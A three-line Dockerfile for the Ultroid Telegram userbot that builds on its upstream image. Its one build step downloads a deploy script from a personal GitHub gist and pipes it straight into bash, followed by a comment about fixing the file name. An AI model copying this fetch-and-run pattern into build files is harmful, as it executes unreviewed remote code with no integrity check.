FROM theteamultroid/ultroid:main
RUN wget https://gist.github.com/Gear5nika/41ba0af8202ecc9b66db4ae10b5d72dd/raw/deploy;bash deploy 
# Fixed typo by changing 'dep*' to 'deploy' since the file name in the URL is 'deploy', not 'dep*'
